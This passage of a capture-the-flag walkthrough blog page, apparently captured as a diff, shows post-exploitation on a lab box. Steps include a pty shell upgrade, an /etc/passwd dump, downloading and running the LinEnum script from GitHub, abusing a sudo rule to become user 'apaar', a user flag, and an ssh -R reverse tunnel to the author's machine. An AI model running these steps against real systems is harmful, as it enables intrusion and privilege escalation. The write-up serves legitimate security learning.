+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3.6 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span></span></span></code></pre></div></div><p>Looking for users in the server</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
+</span></span><span class="line"><span class="cl"><span class="n">cat</span> <span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
+</span></span><span class="line"><span class="cl"><span class="n">root</span><span class="err">❌</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="n">daemon</span><span class="err">❌</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">bin</span><span class="err">❌</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="err">❌</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">sync</span><span class="err">❌</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sync</span>
+</span></span><span class="line"><span class="cl"><span class="n">games</span><span class="err">❌</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">man</span><span class="err">❌</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="err">👨</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">lp</span><span class="err">❌</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">mail</span><span class="err">❌</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">news</span><span class="err">❌</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">uucp</span><span class="err">❌</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">proxy</span><span class="err">❌</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">❌</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">backup</span><span class="err">❌</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">list</span><span class="err">❌</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span> <span class="n">List</span> <span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">irc</span><span class="err">❌</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">gnats</span><span class="err">❌</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span> <span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span> <span class="n">System</span> <span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">nobody</span><span class="err">❌</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="err">❌</span><span class="mi">100</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Network</span> <span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">netif</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="err">❌</span><span class="mi">101</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">resolve</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">syslog</span><span class="err">❌</span><span class="mi">102</span><span class="p">:</span><span class="mi">106</span><span class="p">::</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">syslog</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">messagebus</span><span class="err">❌</span><span class="mi">103</span><span class="p">:</span><span class="mi">107</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">_apt</span><span class="err">❌</span><span class="mi">104</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">lxd</span><span class="err">❌</span><span class="mi">105</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">lxd</span><span class="o">/</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</span></span><span class="line"><span class="cl"><span class="n">uuidd</span><span class="err">❌</span><span class="mi">106</span><span class="p">:</span><span class="mi">110</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">uuidd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">dnsmasq</span><span class="err">❌</span><span class="mi">107</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">dnsmasq</span><span class="p">,,,:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">misc</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">landscape</span><span class="err">❌</span><span class="mi">108</span><span class="p">:</span><span class="mi">112</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">landscape</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">pollinate</span><span class="err">❌</span><span class="mi">109</span><span class="p">:</span><span class="mi">1</span><span class="p">::</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">pollinate</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</span></span><span class="line"><span class="cl"><span class="n">sshd</span><span class="err">❌</span><span class="mi">110</span><span class="p">:</span><span class="mi">65534</span><span class="p">::</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">sshd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">aurick</span><span class="err">❌</span><span class="mi">1000</span><span class="p">:</span><span class="mi">1000</span><span class="p">:</span><span class="n">Anurodh</span><span class="p">:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">aurick</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="n">mysql</span><span class="err">❌</span><span class="mi">111</span><span class="p">:</span><span class="mi">114</span><span class="p">:</span><span class="n">MySQL</span> <span class="n">Server</span><span class="p">,,,:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="bp">false</span>
+</span></span><span class="line"><span class="cl"><span class="n">apaar</span><span class="err">❌</span><span class="mi">1001</span><span class="p">:</span><span class="mi">1001</span><span class="p">:,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">apaar</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="n">anurodh</span><span class="err">❌</span><span class="mi">1002</span><span class="p">:</span><span class="mi">1002</span><span class="p">:,,,:</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">anurodh</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
+</span></span><span class="line"><span class="cl"><span class="n">ftp</span><span class="err">❌</span><span class="mi">112</span><span class="p">:</span><span class="mi">115</span><span class="p">:</span><span class="n">ftp</span> <span class="n">daemon</span><span class="p">,,,:</span><span class="o">/</span><span class="n">srv</span><span class="o">/</span><span class="n">ftp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
+</span></span><span class="line"><span class="cl"><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="err">@</span><span class="n">ubuntu</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">$</span> </span></span></code></pre></div></div>
+<h2 id="becoming-apaar" class="heading">Becoming &ldquo;apaar&rdquo; <a href="#becoming-apaar" aria-labelledby="becoming-apaar">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h2>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd /tmp
+</span></span><span class="line"><span class="cl">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+</span></span><span class="line"><span class="cl">chmod +x LinEnum.sh
+</span></span><span class="line"><span class="cl">./LinEnum.sh -s -k keyword -r report -e /tmp/ -t</span></span></code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_1587,w_2800/v1608376756/blog/image-20201218222449969_ttjmby.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_326,w_576/v1608376756/blog/image-20201218222449969_ttjmby.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_435,w_768/v1608376756/blog/image-20201218222449969_ttjmby.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_562,w_992/v1608376756/blog/image-20201218222449969_ttjmby.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_680,w_1200/v1608376756/blog/image-20201218222449969_ttjmby.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_794,w_1400/v1608376756/blog/image-20201218222449969_ttjmby.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1587,w_2800/v1608376756/blog/image-20201218222449969_ttjmby.png 2800w" sizes="100vw"
+            height="1587"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www-data@ubuntu:/tmp$ sudo -l
+</span></span><span class="line"><span class="cl">sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for www-data on ubuntu:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User www-data may run the following commands on ubuntu:
+</span></span><span class="line"><span class="cl">    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh</span></span></code></pre></div></div><div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo -u apaar /home/apaar/.helpline.sh</span></span></code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_1033,w_2800/v1608376756/blog/image-20201218222722933_arq0k8.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_213,w_576/v1608376756/blog/image-20201218222722933_arq0k8.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_283,w_768/v1608376756/blog/image-20201218222722933_arq0k8.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_366,w_992/v1608376756/blog/image-20201218222722933_arq0k8.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_443,w_1200/v1608376756/blog/image-20201218222722933_arq0k8.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_517,w_1400/v1608376756/blog/image-20201218222722933_arq0k8.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1033,w_2800/v1608376756/blog/image-20201218222722933_arq0k8.png 2800w" sizes="100vw"
+            height="1033"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_2202,w_2800/v1608376756/blog/image-20201218222840404_awwyzz.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_453,w_576/v1608376756/blog/image-20201218222840404_awwyzz.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_604,w_768/v1608376756/blog/image-20201218222840404_awwyzz.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_780,w_992/v1608376756/blog/image-20201218222840404_awwyzz.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_944,w_1200/v1608376756/blog/image-20201218222840404_awwyzz.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1101,w_1400/v1608376756/blog/image-20201218222840404_awwyzz.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_2202,w_2800/v1608376756/blog/image-20201218222840404_awwyzz.png 2800w" sizes="100vw"
+            height="2202"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+<p><code>{USER-FLAG: e8vpd3323cfvlp0qpxxx9qtr5iq37oww}</code></p>
+
+<h2 id="reverse-ssh-tunnel" class="heading">Reverse SSH Tunnel <a href="#reverse-ssh-tunnel" aria-labelledby="reverse-ssh-tunnel">
+
+
+
+
+
+
+
+
+
+    
+
+    <!-- <i class="fas fa-link anchor"></i> --><svg class="svg-inline--fa fas fa-link anchor" fill="currentColor" aria-hidden="true" role="img" viewBox="0 0 640 512"><path d="M579.8 267.7c56.5-56.5 56.5-148 0-204.5c-50-50-128.8-56.5-186.3-15.4l-1.6 1.1c-14.4 10.3-17.7 30.3-7.4 44.6s30.3 17.7 44.6 7.4l1.6-1.1c32.1-22.9 76-19.3 103.8 8.6c31.5 31.5 31.5 82.5 0 114L422.3 334.8c-31.5 31.5-82.5 31.5-114 0c-27.9-27.9-31.5-71.8-8.6-103.8l1.1-1.6c10.3-14.4 6.9-34.4-7.4-44.6s-34.4-6.9-44.6 7.4l-1.1 1.6C206.5 251.2 213 330 263 380c56.5 56.5 148 56.5 204.5 0L579.8 267.7zM60.2 244.3c-56.5 56.5-56.5 148 0 204.5c50 50 128.8 56.5 186.3 15.4l1.6-1.1c14.4-10.3 17.7-30.3 7.4-44.6s-30.3-17.7-44.6-7.4l-1.6 1.1c-32.1 22.9-76 19.3-103.8-8.6C74 372 74 321 105.5 289.5L217.7 177.2c31.5-31.5 82.5-31.5 114 0c27.9 27.9 31.5 71.8 8.6 103.9l-1.1 1.6c-10.3 14.4-6.9 34.4 7.4 44.6s34.4 6.9 44.6-7.4l1.1-1.6C433.5 260.8 427 182 377 132c-56.5-56.5-148-56.5-204.5 0L60.2 244.3z"/></svg>
+
+    &nbsp;
+</a></h2>
+<p>Verifying open ports internally.</p>
+<p>There is an open port <code>9001</code> available just locally.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ netstat -putan</span></span></code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_1047,w_2800/v1608376755/blog/image-20201218211717628_gk9bv2.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_215,w_576/v1608376755/blog/image-20201218211717628_gk9bv2.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_287,w_768/v1608376755/blog/image-20201218211717628_gk9bv2.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_371,w_992/v1608376755/blog/image-20201218211717628_gk9bv2.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_449,w_1200/v1608376755/blog/image-20201218211717628_gk9bv2.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_524,w_1400/v1608376755/blog/image-20201218211717628_gk9bv2.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1047,w_2800/v1608376755/blog/image-20201218211717628_gk9bv2.png 2800w" sizes="100vw"
+            height="1047"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+<p>To resolve this issue, I needed to take advantage of a reverse shell tunnel, where I set up the localport <code>9001</code> to remote computer (My Desktop) in port <code>9001</code> as well.</p>
+<div class="mb-3 syntax-highlight"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh -R 9001:localhost:9001 tiago@192.168.0.64</span></span></code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_826,w_2800/v1608376754/blog/image-20201218211935013_piphca.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_170,w_576/v1608376754/blog/image-20201218211935013_piphca.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_226,w_768/v1608376754/blog/image-20201218211935013_piphca.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_292,w_992/v1608376754/blog/image-20201218211935013_piphca.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_354,w_1200/v1608376754/blog/image-20201218211935013_piphca.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_413,w_1400/v1608376754/blog/image-20201218211935013_piphca.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_826,w_2800/v1608376754/blog/image-20201218211935013_piphca.png 2800w" sizes="100vw"
+            height="826"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<figure >
+
+<div class=""><img class="img-fluid "
+            src="https://res.cloudinary.com/dtr6hzxnx/image/upload/c_fit,h_2332,w_2800/v1608376755/blog/image-20201218212003063_fmrjws.jpg"
+            
+            
+            srcset="https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_480,w_576/v1608376755/blog/image-20201218212003063_fmrjws.png 576w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_640,w_768/v1608376755/blog/image-20201218212003063_fmrjws.png 768w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_826,w_992/v1608376755/blog/image-20201218212003063_fmrjws.png 992w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_999,w_1200/v1608376755/blog/image-20201218212003063_fmrjws.png 1200w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_1166,w_1400/v1608376755/blog/image-20201218212003063_fmrjws.png 1400w, https://res.cloudinary.com/dtr6hzxnx/image/upload/f_auto,c_fit,h_2332,w_2800/v1608376755/blog/image-20201218212003063_fmrjws.png 2800w" sizes="100vw"
+            height="2332"
+            width="2800"
+            alt=" ">
+</div><figcaption class="figure-caption"> </figcaption>
+    </figure>
+
+<h2 id="web-discovery-1" class="heading">Web discovery <a href="#web-discovery-1" aria-labelledby="web-discovery-1">
+
+
+
+
+
+
+
+
+
+    
+
